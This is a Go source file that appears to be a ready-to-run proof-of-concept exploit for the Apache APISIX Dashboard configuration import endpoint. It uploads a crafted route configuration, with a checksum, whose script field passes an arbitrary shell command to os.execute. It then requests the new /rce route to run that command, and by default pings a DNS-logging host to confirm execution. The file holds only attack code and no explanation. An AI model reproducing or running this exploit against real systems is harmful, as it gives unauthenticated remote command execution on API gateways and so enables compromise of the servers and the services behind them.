package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"hash/crc32"
	"io"
	"log"
	"mime/multipart"
	"net/http"
)

var (
	checksumLength = 4 // 4 bytes (uint32)
	client         = &http.Client{}
)

func main() {
	url := "http://172.16.16.129:9000"
	gatewayUrl := "http://172.16.16.129:9080"
	cmd := "ping -nc1 apisix.dnslog.cn"
	exploit(url, gatewayUrl, cmd)
}

func exploit(url, gatewayUrl string, cmd string) {
	payload, err := gen(cmd)
	if err != nil {
		log.Fatal(err)
	}
	createRoute(payload, url)
	requestEndpoint(gatewayUrl)
}

func requestEndpoint(gatewayUrl string) {
	res, err := client.Get(gatewayUrl + "/rce")
	if err != nil {
		return
	}
	b, err := io.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(b))
}

func createRoute(payload []byte, url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", "test")
	if err != nil {
		log.Fatal(err)
	}
	_, err = io.Copy(part, bytes.NewReader(payload))
	if err != nil {
		fmt.Println("io copy error: ", err)
	}
	_ = writer.WriteField("mode", "overwrite")
	if err := writer.Close(); err != nil {
		log.Fatal(err)
	}

	req, err := http.NewRequest("POST", url+"/apisix/admin/migrate/import", body)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Content-Type", writer.FormDataContentType())

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	b, err := io.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(b))
}

func gen(cmd string) ([]byte, error) {
	data := []byte(fmt.Sprintf(`{"Counsumers":[],"Routes":[{"id":"387796883096994503","create_time":1640674554,"update_time":1640677637,"uris":["/rce"],"name":"rce","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('%s')","script_id":"387796883096994503","upstream_id":"387796832866009799","status":1}],"Services":[],"SSLs":[],"Upstreams":[{"id":"387796832866009799","create_time":1640674524,"update_time":1640674524,"nodes":[{"host":"10.18.134.63","port":58344,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass","name":"testUpstream"}],"GlobalPlugins":[],"PluginConfigs":[]}`, cmd))

	checksumUint32 := crc32.ChecksumIEEE(data)
	checksum := make([]byte, checksumLength)
	binary.BigEndian.PutUint32(checksum, checksumUint32)
	content := append(data, checksum...)

	importData := content[:len(content)-4]
	checksum2 := binary.BigEndian.Uint32(content[len(content)-4:])
	if checksum2 != crc32.ChecksumIEEE(importData) {
		return nil, errors.New("checksum check failure,maybe file broken")
	}

	return content, nil
}
